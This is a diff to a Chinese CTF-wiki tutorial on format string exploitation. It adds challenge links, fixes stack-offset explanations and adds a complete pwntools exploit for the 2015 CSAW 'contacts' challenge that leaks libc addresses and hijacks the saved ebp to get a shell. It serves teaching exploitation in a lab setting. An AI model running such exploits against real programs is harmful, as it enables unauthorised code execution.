@@ -10,7 +10,7 @@
 
 ### 例子
 
-这里，我们以 2017 年的 UIUCTF 中 pwn200 GoodLuck 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。
+这里，我们以 2017 年的 UIUCTF 中 [pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck) 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。
 
 #### 确定保护
 
@@ -148,7 +148,7 @@ sh.interactive()
 
 ### 例子
 
-这里我们以 2016 CCTF 中的 pwn3 为例进行介绍。
+这里我们以 2016 CCTF 中的 [pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3) 为例进行介绍。
 
 #### 确定保护
 
@@ -291,7 +291,7 @@ sh.interactive()
 
 ### 例子
 
-这里我们以三个白帽-pwnme\_k0 为例进行分析。
+这里我们以 [三个白帽-pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/三个白帽-pwnme_k0) 为例进行分析。
 
 #### 确定保护
 
@@ -482,7 +482,7 @@ sh.interactive()
 
 ### 例子
 
-这里我们以 2015 年 CSAW 中的 contacts 为例进行介绍。
+这里我们以 2015 年 CSAW 中的 [contacts](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts) 为例进行介绍。
 
 #### 确定保护
 
@@ -617,7 +617,7 @@ gef➤  dereference $esp l140
 0xffffcd7c│+0x80: 0xf7e13637  →  <__libc_start_main+247> add esp, 0x10
 ```
 
-存储的就是 main 相应的地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31。
+存储的是__libc_start_main的返回地址，同时利用 fmtarg 来获取对应的偏移，可以看出其偏移为 32，那么相对于格式化字符串的偏移为 31。
 
 ```shell
 gef➤  fmtarg 0xffffcd7c
@@ -626,9 +626,9 @@ The index of format argument : 32
 
 这样我们便可以得到对应的地址了。进而可以根据 libc-database 来获取对应的 libc，继而获取 system 函数地址与 /bin/sh 函数地址了。
 
-其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 6，得到这个是为了构造我们的联系人。
+其次，我们可以确定栈上存储格式化字符串的地址 0xffffcd2c 相对于格式化字符串的偏移为 11，得到这个是为了构造我们的联系人。
 
-再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 11，这样我们可以直接修改上层函数存储的 ebp 的值。
+再者，我们可以看出下面的地址保存着上层函数的调用地址，其相对于格式化字符串的偏移为 6，这样我们可以直接修改上层函数存储的 ebp 的值。
 
 ```shell
 0xffffcd18│+0x1c: 0xffffcd48  →  0xffffcd78  →  0x00000000	 ← $ebp
@@ -645,6 +645,14 @@ The index of format argument : 32
 来获取对应的相应的地址。后面的 bbbb 是为了接受字符串方便。
 
 这里因为函数调用时所申请的栈空间与释放的空间是一致的，所以我们得到的 ebp 地址并不会因为我们再次调用而改变。
+
+在部分环境下，system地址会出现\x00，导致printf的时候出现0截断导致无法泄露两个地址，因此可以将payload的修改如下：
+
+```text
+[%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd]
+```
+
+payload修改为这样的话，还需要在heap上加入12的偏移。这样保证了0截断出现在泄露之后。
 
 #### 修改ebp
 
@@ -742,8 +750,81 @@ sh.recvuntil('>>> ')
 sh.sendline('5')
 sh.interactive()
 ```
+system出现0截断的情况下，exp如下:
+```python
+from pwn import *
+context.log_level="debug"
+context.arch="x86"
+
+io=process("./contacts")
+binary=ELF("contacts")
+libc=binary.libc
+
+def createcontact(io, name, phone, descrip_len, description):
+	sh=io
+	sh.recvuntil('>>> ')
+	sh.sendline('1')
+	sh.recvuntil('Contact info: \n')
+	sh.recvuntil('Name: ')
+	sh.sendline(name)
+	sh.recvuntil('You have 10 numbers\n')
+	sh.sendline(phone)
+	sh.recvuntil('Length of description: ')
+	sh.sendline(descrip_len)
+	sh.recvuntil('description:\n\t\t')
+	sh.sendline(description)
+def printcontact(io):
+	sh=io
+	sh.recvuntil('>>> ')
+	sh.sendline('4')
+	sh.recvuntil('Contacts:')
+	sh.recvuntil('Description: ')
+
+#gdb.attach(io)
+
+createcontact(io,"1","1","111","%31$paaaa")
+printcontact(io)
+libc_start_main = int(io.recvuntil('aaaa', drop=True), 16)-241
+log.success('get libc_start_main addr: ' + hex(libc_start_main))
+libc_base=libc_start_main-libc.symbols["__libc_start_main"]
+system=libc_base+libc.symbols["system"]
+binsh=libc_base+next(libc.search("/bin/sh"))
+log.success("system: "+hex(system))
+log.success("binsh: "+hex(binsh))
+
+payload = '%6$p%11$pccc'+p32(system)+'bbbb'+p32(binsh)+"dddd"
+createcontact(io,'2', '2', '111', payload)
+printcontact(io)
+io.recvuntil('Description: ')
+data = io.recvuntil('ccc', drop=True)
+data = data.split('0x')
+print data
+ebp_addr = int(data[1], 16)
+heap_addr = int(data[2], 16)+12
+log.success("ebp: "+hex(system))
+log.success("heap: "+hex(heap_addr))
+
+part1 = (heap_addr - 4) / 2
+part2 = heap_addr - 4 - part1
+payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'
+
+#payload=fmtstr_payload(6,{ebp_addr:heap_addr})
+##print payload
+createcontact(io,'3333', '123456789', '300', payload)
+printcontact(io)
+io.recvuntil('Description: ')
+io.recvuntil('Description: ')
+##gdb.attach(sh)
+log.success("get shell")
+io.recvuntil('>>> ')
+##get shell
+io.sendline('5')
+io.interactive()
+```
 
 需要注意的是，这样并不能稳定得到 shell，因为我们一次性输入了太长的字符串。但是我们又没有办法在前面控制所想要输入的地址。只能这样了。
+
+为什么需要打印这么多呢？因为格式化字符串不在栈上，所以就算我们得到了需要更改的ebp的地址，也没有办法去把这个地址写到栈上，利用$符号去定位他；因为没有办法定位，所以没有办法用l\ll等方式去写这个地址，所以只能打印很多。
 
 ## 格式化字符串盲打
 
@@ -759,7 +840,7 @@ sh.interactive()
 
 ### 例子1-泄露栈
 
-源码和部署文件均放在了对应的文件夹 fmt\_blind\_stack 中。
+源码和部署文件均放在了对应的文件夹 [fmt_blind_stack](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_stack) 中。
 
 #### 确定程序位数
 
@@ -814,7 +895,7 @@ g}\x00\x00\x00\x00\x00\x00
 
 ### 例子2-盲打劫持got
 
-源码以及部署文件均已经在 blind\_fmt\_got 文件夹中。
+源码以及部署文件均已经在 [blind_fmt_got](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/blind_fmt_got) 文件夹中。
 
 #### 确定程序位数
 
@@ -1051,3 +1132,6 @@ offset = (int)(math.ceil(len(payload) / 8.0) + 1)
 ```
 
 这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于 '%order$hn' 中 order 多出来的字符都不会大于 8。具体的可以自行推导。
+
+### 题目
+- SuCTF2018 - lock2 （主办方提供了 docker 镜像: suctf/2018-pwn-lock2）
